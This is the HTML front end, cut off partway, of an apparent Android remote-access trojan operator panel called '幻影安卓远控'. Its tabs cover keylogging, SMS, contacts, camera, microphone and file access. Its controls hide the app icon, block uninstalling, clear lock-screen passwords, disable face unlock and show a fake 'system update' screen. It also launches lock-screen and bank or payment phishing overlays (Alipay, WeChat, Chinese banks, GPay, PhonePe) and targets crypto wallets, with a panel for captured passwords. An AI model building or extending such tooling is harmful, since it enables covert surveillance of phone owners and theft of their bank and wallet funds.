<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>设备控制中心 - 幻影安卓远控</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Noto+Sans+SC:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-primary: #0d0d12;
            --bg-secondary: #13131a;
            --bg-card: #1a1a24;
            --bg-hover: #22222e;
            --border: #2d2d3a;
            --text: #e8e8ed;
            --text-secondary: #9090a0;
            --text-muted: #606070;
            --accent: #00d4ff;
            --accent-purple: #a855f7;
            --success: #22c55e;
            --warning: #f59e0b;
            --danger: #ef4444;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Noto Sans SC', -apple-system, sans-serif;
            background: var(--bg-primary);
            color: var(--text);
            min-height: 100vh;
            font-size: 14px;
        }
        .container { max-width: 1800px; margin: 0 auto; padding: 16px; }
        .header { display: flex; align-items: center; justify-content: space-between; padding: 12px 20px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 16px; }
        .logo { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 600; }
        .logo img { width: 32px; height: 32px; border-radius: 8px; object-fit: cover; }
        .status-box { display: flex; align-items: center; gap: 16px; }
        .ws-status { display: flex; align-items: center; gap: 8px; padding: 6px 14px; background: var(--bg-secondary); border-radius: 20px; font-size: 12px; }
        .ws-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger); }
        .ws-dot.online { background: var(--success); animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .main { display: grid; grid-template-columns: 300px 1fr; gap: 16px; }
        .card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 16px; }
        .card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
        .card-title { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 600; }
        .card-title i { color: var(--accent); }
        .device-badge { padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 500; }
        .device-badge.online { background: rgba(34,197,94,0.15); color: var(--success); border: 1px solid rgba(34,197,94,0.3); }
        .device-badge.offline { background: rgba(239,68,68,0.15); color: var(--danger); border: 1px solid rgba(239,68,68,0.3); }
        .info-list { display: flex; flex-direction: column; gap: 6px; }
        .info-row { display: flex; align-items: center; justify-content: space-between; padding: 8px 10px; background: var(--bg-secondary); border-radius: 6px; }
        .info-label { display: flex; align-items: center; gap: 6px; color: var(--text-secondary); font-size: 12px; }
        .info-label i { width: 14px; color: var(--accent); opacity: 0.7; }
        .info-value { font-family: 'JetBrains Mono', monospace; font-size: 12px; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .battery { display: flex; align-items: center; gap: 6px; }
        .battery-bar { width: 28px; height: 11px; background: var(--bg-primary); border: 1.5px solid var(--text-secondary); border-radius: 2px; position: relative; }
        .battery-bar::after { content: ''; position: absolute; right: -4px; top: 50%; transform: translateY(-50%); width: 2px; height: 5px; background: var(--text-secondary); border-radius: 0 2px 2px 0; }
        .battery-level { height: 100%; background: var(--success); transition: width 0.3s; }
        .battery-level.low { background: var(--danger); }
        .battery-level.medium { background: var(--warning); }
        .sidebar { display: flex; flex-direction: column; gap: 14px; height: calc(100vh - 180px); overflow: hidden; }
        .sidebar .card { flex-shrink: 0; }
        .sidebar #textAssistBox { flex: 1; min-height: 0; display: flex; flex-direction: column; margin-top: 0; }
        .tabs { display: flex; gap: 4px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 4px; margin-bottom: 16px; flex-wrap: wrap; }
        .tab { flex: 1; min-width: 70px; padding: 8px 10px; border: none; background: transparent; color: var(--text-secondary); border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 5px; transition: all 0.2s; }
        .tab:hover { background: var(--bg-hover); color: var(--text); }
        .tab.active { background: linear-gradient(135deg, var(--accent), var(--accent-purple)); color: white; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .screen-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; align-items: stretch; }
        .screen-box { background: var(--bg-secondary); border-radius: 10px; overflow: hidden; display: flex; flex-direction: column; min-height: calc(100vh - 180px); }
        .screen-header { padding: 10px 14px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .screen-display { flex: 1; display: flex; align-items: center; justify-content: center; position: relative; touch-action: none; min-height: calc(100vh - 280px); }
        .screen-display img { max-width: 100%; max-height: calc(100vh - 300px); cursor: crosshair; user-select: none; -webkit-user-drag: none; pointer-events: auto; }
        .screen-display:active img { cursor: grabbing; }
        .screen-placeholder { color: var(--text-muted); text-align: center; }
        .screen-placeholder i { font-size: 48px; margin-bottom: 10px; opacity: 0.3; }
        .screen-controls { padding: 10px; border-top: 1px solid var(--border); display: flex; gap: 6px; flex-wrap: wrap; }
        .ctrl-column { display: flex; flex-direction: column; gap: 14px; height: calc(100vh - 180px); overflow-y: auto; overflow-x: hidden; }
        .ctrl-card { background: var(--bg-secondary); border-radius: 10px; padding: 14px; flex-shrink: 0; }
        .ctrl-card:last-child { flex: 1; min-height: 0; display: flex; flex-direction: column; }
        .ctrl-card-title { font-size: 14px; font-weight: 600; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
        .ctrl-card-title i { color: var(--accent); }
        .ctrl-grid { display: flex; flex-wrap: wrap; gap: 8px; }
        .ctrl-grid .btn { font-size: 12px; padding: 8px 14px; }
        .ctrl-input-row { display: flex; gap: 8px; margin-top: 12px; }
        .ctrl-input-row input { flex: 1; }
        .btn { padding: 7px 12px; border: none; border-radius: 6px; font-size: 12px; font-weight: 500; cursor: pointer; display: inline-flex; align-items: center; gap: 5px; transition: all 0.2s; }
        .btn-primary { background: linear-gradient(135deg, var(--accent), var(--accent-purple)); color: white; }
        .btn-primary:hover { opacity: 0.9; transform: translateY(-1px); }
        .btn-secondary { background: var(--bg-hover); color: var(--text); border: 1px solid var(--border); }
        .btn-secondary:hover { border-color: var(--accent); color: var(--accent); }
        .btn-dark { background: #1a1a1a; color: #fff; border: 1px solid #333; }
        .btn-dark:hover { background: #2a2a2a; border-color: #555; }
        .btn-success { background: var(--success); color: white; }
        .btn-danger { background: var(--danger); color: white; }
        .btn-warning { background: #f59e0b; color: white; }
        .btn-info { background: #06b6d4; color: white; }
        .btn-sm { padding: 5px 8px; font-size: 11px; }
        .actions-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px; max-height: 300px; overflow-y: auto; padding-right: 4px; }
        .action-btn { display: flex; flex-direction: column; align-items: center; gap: 3px; padding: 8px 4px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; cursor: pointer; transition: all 0.2s; color: var(--text); }
        .action-btn i { font-size: 16px; color: var(--accent); }
        .action-btn span { font-size: 10px; color: var(--text-secondary); }
        .action-btn:hover { border-color: var(--accent); background: rgba(0,212,255,0.1); transform: translateY(-2px); }
        .input-row { display: flex; gap: 8px; margin-top: 10px; }
        .input { flex: 1; padding: 9px 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-size: 12px; }
        .input:focus { outline: none; border-color: var(--accent); }
        .input::placeholder { color: var(--text-muted); }
        .log-viewer { background: var(--bg-secondary); border-radius: 8px; padding: 12px; max-height: 500px; overflow-y: auto; }
        .log-entry { padding: 10px 12px; background: var(--bg-card); border-radius: 6px; margin-bottom: 6px; border-left: 3px solid var(--accent); }
        .log-time { font-size: 10px; color: var(--text-muted); margin-bottom: 3px; }
        .log-content { font-size: 12px; word-break: break-all; line-height: 1.4; }
        .list-item { display: flex; align-items: center; gap: 12px; padding: 10px 12px; background: var(--bg-card); border-radius: 8px; margin-bottom: 6px; }
        .list-item:hover { background: var(--bg-hover); }
        .item-avatar { width: 36px; height: 36px; background: linear-gradient(135deg, var(--accent), var(--accent-purple)); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 14px; flex-shrink: 0; }
        .item-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        .item-info { flex: 1; overflow: hidden; }
        .item-name { font-weight: 500; margin-bottom: 2px; font-size: 13px; }
        .item-sub { font-size: 11px; color: var(--text-muted); }
        .item-actions { display: flex; gap: 4px; }
        .file-item { display: flex; align-items: center; gap: 12px; padding: 10px 12px; background: var(--bg-card); border-radius: 8px; margin-bottom: 6px; cursor: pointer; }
        .file-item:hover { background: var(--bg-hover); }
        .file-icon { width: 32px; height: 32px; background: var(--bg-secondary); border-radius: 6px; display: flex; align-items: center; justify-content: center; }
        .file-icon i { font-size: 14px; color: var(--accent); }
        .file-icon.folder i { color: var(--warning); }
        .file-info { flex: 1; }
        .file-name { font-size: 12px; margin-bottom: 2px; }
        .file-meta { font-size: 10px; color: var(--text-muted); }
        .path-bar { display: flex; align-items: center; gap: 8px; padding: 8px 12px; background: var(--bg-secondary); border-radius: 6px; margin-bottom: 12px; }
        .path-bar input { flex: 1; background: transparent; border: none; color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 12px; }
        .path-bar input:focus { outline: none; }
        .loading, .status-msg { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; color: var(--text-muted); }
        .status-msg i { font-size: 32px; margin-bottom: 10px; opacity: 0.5; }
        .spinner { width: 28px; height: 28px; border: 3px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .progress-bar { width: 200px; height: 4px; background: var(--border); border-radius: 2px; overflow: hidden; margin-bottom: 10px; }
        .progress-bar-inner { height: 100%; background: linear-gradient(90deg, var(--accent), var(--success)); animation: progress 1.5s ease-in-out infinite; }
        @keyframes progress { 0% { width: 0%; margin-left: 0; } 50% { width: 60%; margin-left: 20%; } 100% { width: 0%; margin-left: 100%; } }
        .toast { position: fixed; bottom: 20px; right: 20px; padding: 10px 16px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; display: flex; align-items: center; gap: 8px; transform: translateY(100px); opacity: 0; transition: all 0.3s; z-index: 1000; }
        .toast.show { transform: translateY(0); opacity: 1; }
        .toast.success { border-color: var(--success); }
        .toast.error { border-color: var(--danger); }
        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 1000; display: flex; justify-content: center; align-items: center; }
        .modal-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; min-width: 350px; max-width: 90%; }
        .modal-header { padding: 14px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; font-weight: 600; }
        .modal-body { padding: 16px; }
        .modal-footer { padding: 12px 16px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 10px; }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: var(--bg-secondary); border-radius: 3px; }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #404050; }
        @media (max-width: 1200px) { .main { grid-template-columns: 1fr; } .screen-grid { grid-template-columns: 1fr; } .sidebar { display: none; } }
        @media (max-width: 768px) { .actions-grid { grid-template-columns: repeat(4, 1fr); } .ctrl-grid .btn { font-size: 10px; padding: 5px 8px; } }
        .offline-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(13, 13, 18, 0.95); z-index: 100; display: flex; align-items: center; justify-content: center; border-radius: 12px; }
        .offline-overlay.hidden { display: none; }
        .offline-content { text-align: center; color: var(--text-muted); }
        .offline-spinner { width: 50px; height: 50px; border: 3px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        .offline-text { font-size: 18px; font-weight: 600; color: var(--text); margin-bottom: 8px; }
        .offline-hint { font-size: 13px; color: var(--text-muted); }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; padding: 12px; max-height: 600px; overflow-y: auto; position: relative; min-height: 200px; }
        .gallery-grid .status-msg, .gallery-grid .loading { grid-column: 1 / -1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 60px 20px; }
        .gallery-item { position: relative; aspect-ratio: 1; border-radius: 8px; overflow: hidden; cursor: pointer; background: var(--bg-secondary); border: 2px solid transparent; transition: all 0.2s; display: flex; align-items: center; justify-content: center; }
        .gallery-item:hover { border-color: var(--accent); transform: scale(1.02); }
        .gallery-item img { width: 100%; height: 100%; object-fit: cover; }
        .gallery-item .gallery-name { position: absolute; bottom: 0; left: 0; right: 0; padding: 4px 6px; background: linear-gradient(transparent, rgba(0,0,0,0.8)); font-size: 10px; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .gallery-item .gallery-loading { color: var(--text-muted); display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .gallery-preview { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .gallery-preview img { max-width: 90%; max-height: 70vh; object-fit: contain; border-radius: 8px; }
        .gallery-preview-close { position: absolute; top: 20px; right: 20px; width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.1); border: none; color: white; font-size: 20px; cursor: pointer; transition: all 0.2s; }
        .gallery-preview-close:hover { background: rgba(255,255,255,0.2); }
        .gallery-preview-info { margin-top: 16px; text-align: center; color: var(--text-muted); font-size: 13px; }
        .gallery-preview-actions { margin-top: 12px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
        .gallery-preview .preview-loading { display: flex; flex-direction: column; align-items: center; gap: 16px; color: var(--text-muted); }
        .gallery-preview .preview-loading .spinner { width: 40px; height: 40px; border: 3px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 1s linear infinite; }
        
        /* 一键展示弹窗 */
        .quick-gallery-modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); z-index: 9000; display: flex; flex-direction: column; overflow: hidden; }
        .quick-gallery-header { padding: 12px 20px; background: var(--card-bg); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; z-index: 9001; }
        .quick-gallery-header h3 { margin: 0; font-size: 16px; color: var(--text); }
        .quick-gallery-header .info { color: var(--text-muted); font-size: 12px; }
        .quick-gallery-body { flex: 1; overflow-y: auto; padding: 16px; }
        .quick-gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
        .quick-gallery-item { aspect-ratio: 1; background: var(--bg); border-radius: 8px; overflow: hidden; cursor: pointer; position: relative; border: 2px solid transparent; transition: all 0.2s; }
        .quick-gallery-item:hover { border-color: var(--accent); transform: scale(1.02); }
        .quick-gallery-item.selected { border-color: var(--success); box-shadow: 0 0 0 2px var(--success); }
        .quick-gallery-item img { width: 100%; height: 100%; object-fit: cover; }
        .quick-gallery-item .thumb-loading { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; background: var(--bg); color: var(--text-muted); font-size: 20px; }
        .quick-gallery-item .thumb-cached { position: absolute; top: 4px; right: 4px; width: 16px; height: 16px; background: var(--success); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; color: white; }
        .quick-gallery-progress { position: absolute; bottom: 0; left: 0; right: 0; height: 3px; background: var(--border); }
        .quick-gallery-progress-bar { height: 100%; background: var(--accent); transition: width 0.3s; }
        
        /* 一键展示内部预览 */
        .quick-preview-panel { position: fixed; top: 60px; right: 20px; bottom: 20px; width: 45%; background: var(--card-bg); border-radius: 12px; z-index: 9002; display: flex; flex-direction: column; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .quick-preview-panel .preview-header { padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .quick-preview-panel .preview-header h4 { margin: 0; font-size: 14px; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .quick-preview-panel .preview-body { flex: 1; display: flex; align-items: center; justify-content: center; padding: 16px; overflow: hidden; background: #000; }
        .quick-preview-panel .preview-body img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 4px; }
        .quick-preview-panel .preview-body .loading { color: var(--text-muted); }
        .quick-preview-panel .preview-footer { padding: 12px 16px; border-top: 1px solid var(--border); display: flex; gap: 8px; justify-content: center; }
        @media (max-width: 1200px) { .quick-preview-panel { width: 50%; } }
        @media (max-width: 900px) { .quick-preview-panel { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; height: 80%; } }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo"><img src="logo.jpg" alt="Logo"><span>设备控制中心</span></div>
            <div class="status-box">
                <div class="ws-status">
                    <div class="ws-dot" id="wsDot"></div>
                    <span id="wsText">未连接</span>
                </div>
                <button class="btn btn-danger btn-sm" onclick="reconnect()"><i class="fas fa-sync-alt"></i>重连</button>
                <a href="/pages/list.php" class="btn btn-secondary btn-sm"><i class="fas fa-arrow-left"></i>返回</a>
            </div>
        </header>

        <main class="main">
            <aside class="sidebar">
                <div class="card">
                    <div class="card-header">
                        <div class="card-title"><i class="fas fa-mobile-alt"></i>设备信息</div>
                        <div class="device-badge offline" id="deviceBadge">离线</div>
                    </div>
                    <div class="info-list">
                        <div class="info-row"><div class="info-label"><i class="fas fa-fingerprint"></i>ID</div><div class="info-value" id="infoId">8088322026367240286054</div></div>
                        <div class="info-row"><div class="info-label"><i class="fas fa-tag"></i>备注</div><div class="info-value" id="infoName">--</div></div>
                        <div class="info-row"><div class="info-label"><i class="fas fa-microchip"></i>型号</div><div class="info-value" id="infoModel">--</div></div>
                        <div class="info-row"><div class="info-label"><i class="fab fa-android"></i>版本</div><div class="info-value" id="infoVersion">--</div></div>
                        <div class="info-row"><div class="info-label"><i class="fas fa-phone"></i>号码</div><div class="info-value" id="infoPhone">--</div></div>
                        <div class="info-row"><div class="info-label"><i class="fas fa-globe"></i>IP</div><div class="info-value" id="infoIP">--</div></div>
                        <div class="info-row"><div class="info-label"><i class="fas fa-lock"></i>密码</div><div class="info-value" id="infoPass">--</div></div>
                        <div class="info-row">
                            <div class="info-label"><i class="fas fa-battery-three-quarters"></i>电量</div>
                            <div class="info-value">
                                <div class="battery">
                                    <div class="battery-bar"><div class="battery-level" id="batteryLevel"></div></div>
                                    <span id="batteryText">--%</span>
                                </div>
                            </div>
                        </div>
                        <div class="info-row"><div class="info-label"><i class="fas fa-universal-access"></i>无障碍</div><div class="info-value" id="infoAccess">--</div></div>
                        <div class="info-row"><div class="info-label"><i class="fas fa-clock"></i>心跳</div><div class="info-value" id="infoLastPing">--</div></div>
                    </div>
                </div>
                <div class="screen-box" id="textAssistBox">
                    <div class="screen-header" style="flex-shrink:0;">
                        <span style="font-size:13px;font-weight:500;"><i class="fas fa-font" style="color:var(--accent);margin-right:6px;"></i>文字辅助</span>
                        <div style="display:flex;gap:6px;align-items:center;">
                            <button class="btn btn-sm btn-success" id="textAssistBtn" onclick="toggleTextAssist()"><i class="fas fa-play"></i>开启</button>
                            <button class="btn btn-sm btn-danger" onclick="stopTextAssist()"><i class="fas fa-stop"></i>停止</button>
                        </div>
                    </div>
                    <div class="screen-display" id="textAssistDisplay" style="flex:1; min-height:0; background:#000; display:flex; align-items:center; justify-content:center; overflow:hidden;" onmousedown="handleMouseDown(event)" onmousemove="handleMouseMove(event)" onmouseup="handleMouseUp(event)" onmouseleave="handleMouseUp(event)" ontouchstart="handleTouchStart(event)" ontouchmove="handleTouchMove(event)" ontouchend="handleTouchEnd(event)">
                        <div class="screen-placeholder"><i class="fas fa-font"></i><div>点击开启文字识别</div></div>
                    </div>
                </div>
            </aside>

            <section class="content" style="position:relative;">
                <div id="offlineOverlay" class="offline-overlay">
                    <div class="offline-content">
                        <div class="offline-spinner"></div>
                        <div class="offline-text">正在连接设备...</div>
                        <div class="offline-hint">请等待设备上线</div>
                    </div>
                </div>
                <div class="tabs">
                    <button class="tab active" data-tab="screen"><i class="fas fa-tv"></i>投屏</button>
                    <button class="tab" data-tab="keylog"><i class="fas fa-keyboard"></i>键盘</button>
                    <button class="tab" data-tab="sms"><i class="fas fa-sms"></i>短信</button>
                    <button class="tab" data-tab="contacts"><i class="fas fa-address-book"></i>联系人</button>
                    <button class="tab" data-tab="apps"><i class="fas fa-th"></i>应用</button>
                    <button class="tab" data-tab="inject"><i class="fas fa-syringe"></i>注入记录</button>
                    <button class="tab" data-tab="files"><i class="fas fa-folder"></i>文件</button>
                    <button class="tab" data-tab="camera"><i class="fas fa-camera"></i>相机</button>
                    <button class="tab" data-tab="gallery"><i class="fas fa-images"></i>相册</button>
                    <button class="tab" data-tab="mic"><i class="fas fa-microphone"></i>录音</button>
                </div>

                <!-- 投屏 -->
                <div class="tab-content active" id="tab-screen">
                    <div class="screen-grid">
                        <div class="screen-box">
                            <div class="screen-header">
                                <span style="font-size:13px;font-weight:500;"><i class="fas fa-desktop" style="color:var(--accent);margin-right:6px;"></i>实时投屏</span>
                                <div style="display:flex;gap:6px;align-items:center;">
                                    <select class="input" id="screenMode" style="width:90px;padding:5px 8px;">
                                        <option value="SM">截图</option>
                                        <option value="SN">投屏</option>
                                    </select>
                                    <button class="btn btn-sm btn-success" onclick="startScreen()"><i class="fas fa-play"></i>开启</button>
                                    <button class="btn btn-sm btn-danger" onclick="stopScreen()"><i class="fas fa-stop"></i>停止</button>
                                </div>
                            </div>
                            <div class="screen-display" id="screenDisplay1" onmousedown="handleMouseDown(event)" onmousemove="handleMouseMove(event)" onmouseup="handleMouseUp(event)" onmouseleave="handleMouseUp(event)" ontouchstart="handleTouchStart(event)" ontouchmove="handleTouchMove(event)" ontouchend="handleTouchEnd(event)">
                                <div class="screen-placeholder"><i class="fas fa-mobile-alt"></i><div>点击开启投屏</div></div>
                            </div>
                            <div class="screen-controls" style="justify-content:center;">
                                <button class="btn btn-secondary" onclick="sendNav('bak')"><i class="fas fa-arrow-left"></i>返回</button>
                                <button class="btn btn-secondary" onclick="sendNav('ho')"><i class="fas fa-home"></i>主页</button>
                                <button class="btn btn-secondary" onclick="sendNav('rec')"><i class="fas fa-th-large"></i>多任务</button>
                            </div>
                        </div>
                        <div class="ctrl-column">
                        <div class="ctrl-card">
                            <div class="ctrl-card-title"><i class="fas fa-gamepad"></i>快捷操作</div>
                            <div class="ctrl-grid">
                                <button class="btn btn-warning" onclick="wakeScreen()"><i class="fas fa-sun"></i>点亮</button>
                                <button class="btn btn-secondary" onclick="sendLock(0)"><i class="fas fa-unlock"></i>解锁</button>
                                <button class="btn btn-secondary" onclick="sendLock(1)"><i class="fas fa-lock"></i>锁屏</button>
                                <button class="btn btn-info" onclick="sendMute()"><i class="fas fa-volume-mute"></i>静音</button>
                                <button class="btn btn-success" onclick="sendUnmute()"><i class="fas fa-volume-up"></i>取消静音</button>
                            </div>
                            <div class="ctrl-grid" style="margin-top:8px;">
                                <button class="btn btn-info" onclick="openQuickApp('TP')"><i class="fas fa-wallet"></i>TP</button>
                                <button class="btn btn-success" onclick="openQuickApp('IM')"><i class="fas fa-wallet"></i>IM</button>
                                <button class="btn btn-primary" onclick="openQuickApp('TG')"><i class="fab fa-telegram"></i>TG</button>
                                <button class="btn btn-warning" onclick="openQuickApp('OneKey')"><i class="fas fa-key"></i>OneKey</button>
                                <button class="btn btn-danger" onclick="openQuickApp('波宝')"><i class="fas fa-coins"></i>波宝</button>
                                <button class="btn btn-primary" onclick="openQuickApp('支')"><i class="fab fa-alipay"></i>支付宝</button>
                                <button class="btn btn-success" onclick="openQuickApp('微')"><i class="fab fa-weixin"></i>微信</button>
                            </div>
                            <div class="ctrl-grid" style="margin-top:8px;">
                                <button class="btn btn-secondary" onclick="sendKb(2)"><i class="fas fa-shield-alt"></i>防卸载</button>
                                <button class="btn btn-secondary" onclick="sendKb(3)"><i class="fas fa-unlock-alt"></i>可卸载</button>
                                <button class="btn btn-secondary" onclick="sendBlock(0)"><i class="fas fa-ban"></i>黑屏</button>
                                <button class="btn btn-secondary" onclick="sendBlock(1)"><i class="fas fa-check-circle"></i>取消黑屏</button>
                                <button class="btn btn-secondary" onclick="sendBlock(2)"><i class="fas fa-hand-paper"></i>阻止操作</button>
                                <button class="btn btn-secondary" onclick="sendBlock(3)"><i class="fas fa-hand-pointer"></i>允许操作</button>
                                <button class="btn btn-secondary" onclick="sendLock(2)" title="清除锁屏密码"><i class="fas fa-key"></i>清密码</button>
                                <button class="btn btn-secondary" onclick="sendLock(3)" title="禁用人脸解锁"><i class="fas fa-user-slash"></i>禁人脸</button>
                                <button class="btn btn-secondary" onclick="hideIcon()"><i class="fas fa-eye-slash"></i>隐藏图标</button>
                            </div>
                            <div class="ctrl-input-row">
                                <input type="text" class="input" id="pasteInput" placeholder="输入文本粘贴到设备...">
                                <button class="btn btn-primary" onclick="sendPaste()"><i class="fas fa-paste"></i>粘贴</button>
                            </div>
                            <div style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border);">
                                <div style="font-size:12px;color:var(--text-muted);margin-bottom:8px;"><i class="fas fa-fish" style="margin-right:6px;"></i>密码钓鱼</div>
                                <div class="ctrl-input-row" style="margin-top:0;">
                                    <select class="input" id="phishType" style="flex:1;">
                                        <option value="0">自由选择密码</option>
                                        <option value="1">壁纸图案密码</option>
                                        <option value="2">壁纸数字密码</option>
                                        <option value="3">壁纸混合密码</option>
                                    </select>
                                    <button class="btn btn-danger" onclick="sendPhish()"><i class="fas fa-fish"></i>钓鱼</button>
                                </div>
                                <div style="font-size:11px;color:var(--text-muted);margin-top:10px;margin-bottom:6px;">银行/支付钓鱼</div>
                                <div class="ctrl-grid" style="gap:6px;">
                                    <button class="btn btn-sm" style="background:#1677ff;color:#fff;" onclick="sendBankPhish('a')"><i class="fab fa-alipay"></i>支付宝</button>
                                    <button class="btn btn-sm" style="background:#07c160;color:#fff;" onclick="sendBankPhish('w')"><i class="fab fa-weixin"></i>微信</button>
                                    <button class="btn btn-sm" style="background:#e62129;color:#fff;" onclick="sendBankPhish('yun')"><i class="fas fa-bolt"></i>云闪付</button>
                                    <button class="btn btn-sm" style="background:#0066b3;color:#fff;" onclick="sendBankPhish('jian')"><i class="fas fa-university"></i>建行</button>
                                    <button class="btn btn-sm" style="background:#007d3a;color:#fff;" onclick="sendBankPhish('you')"><i class="fas fa-envelope"></i>邮储</button>
                                    <button class="btn btn-sm" style="background:#009944;color:#fff;" onclick="sendBankPhish('nong')"><i class="fas fa-leaf"></i>农行</button>
                                    <button class="btn btn-sm" style="background:#c9151e;color:#fff;" onclick="sendBankPhish('zhong')"><i class="fas fa-globe-asia"></i>中行</button>
                                    <button class="btn btn-sm" style="background:#e60012;color:#fff;" onclick="sendBankPhish('gong')"><i class="fas fa-industry"></i>工行</button>
                                    <button class="btn btn-sm" style="background:#dc241f;color:#fff;" onclick="sendBankPhish('zhao')"><i class="fas fa-hand-holding-usd"></i>招行</button>
                                    <button class="btn btn-sm" style="background:#4285f4;color:#fff;" onclick="sendBankPhish('gpay')"><i class="fab fa-google-pay"></i>GPay</button>
                                    <button class="btn btn-sm" style="background:#5f259f;color:#fff;" onclick="sendBankPhish('phonepe')"><i class="fas fa-rupee-sign"></i>PhonePe</button>
                                    <button class="btn btn-sm" style="background:#ff6b00;color:#fff;" onclick="sendBankPhish('bc')"><i class="fas fa-coins"></i>BC</button>
                                    <button class="btn btn-sm" style="background:#00a0e9;color:#fff;" onclick="sendBankPhish('mb')"><i class="fas fa-mobile-alt"></i>MB</button>
                                </div>
                            </div>
                            <div style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border);">
                                <div style="font-size:12px;color:var(--text-muted);margin-bottom:8px;"><i class="fas fa-desktop" style="margin-right:6px;"></i>黑屏文字</div>
                                <div class="ctrl-input-row" style="margin-top:0;">
                                    <input type="text" class="input" id="blockText" placeholder="黑屏显示文字内容" style="flex:1;">
                                    <select class="input" id="blockBg" style="width:100px;">
                                        <option value="0">黑色背景</option>
                                        <option value="1">系统更新</option>
                                    </select>
                                    <button class="btn btn-dark" id="blockTextBtn" onclick="toggleBlockText()"><i class="fas fa-tv"></i>显示</button>
                                </div>
                            </div>
                        </div>
                        <div class="ctrl-card" style="margin-top:12px;flex:1;display:flex;flex-direction:column;min-height:200px;">
                            <div class="ctrl-card-title"><i class="fas fa-key"></i>密码信息</div>
                            <div id="pwdContainer" style="display:flex;flex-direction:column;gap:6px;font-size:12px;flex:1;overflow-y:auto;">
                                <div style="color:var(--text-muted);">等待数据...</div>
                            </div>
                        </div>
                        </div>
                    </div>
                </div>

                <!-- 键盘记录 -->
                <div class="tab-content" id="tab-keylog">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-keyboard"></i>键盘记录</div>
                            <div style="display:flex;gap:6px;align-items:center;">
                                <select class="input" id="keylogDate" style="width:150px;"><option value="">选择日期...</option></select>
                                <button class="btn btn-primary" onclick="getKeylogByDate()"><i class="fas fa-eye"></i>查看</button>
                                <button class="btn btn-success" id="keylogToggleBtn" onclick="toggleKeylog()"><i class="fas fa-play"></i>开启</button>
                            </div>
                        </div>
                        <div style="padding:8px 12px;border-bottom:1px solid var(--border);display:flex;gap:8px;">
                            <input type="text" class="input" id="keylogSearch" placeholder="搜索关键词..." style="flex:1;">
